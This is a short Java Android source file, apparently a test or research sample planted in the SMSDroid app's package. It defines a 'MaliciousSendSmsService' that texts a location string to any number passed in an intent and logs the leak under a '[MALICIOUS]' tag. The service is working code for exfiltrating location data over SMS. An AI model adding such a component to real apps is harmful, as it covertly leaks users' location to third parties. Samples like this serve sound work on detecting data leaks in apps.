package de.ub0r.android.smsdroid;

import android.app.Service;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

public class MaliciousSendSmsService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //get recipient number and location from the intent
        String destination = intent.getStringExtra("number");
        String location = intent.getStringExtra("location");

        try{
            //send received information via SMS
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(destination, null, location, null, null);

            //to check if the message is sent and shown in the history
            ContentValues values = new ContentValues();
            values.put("address", destination);
            values.put("body", location);
            getContentResolver().insert(Uri.parse("content://sms/sent"), values);

            Log.d("[MALICIOUS]", "Sent location information (" + location + ") to " + destination);
        } catch (Exception e) {
            Log.d("[MALICIOUS]", "Failed to send SMS");
            e.printStackTrace();
        }

        return START_NOT_STICKY;
    }
}
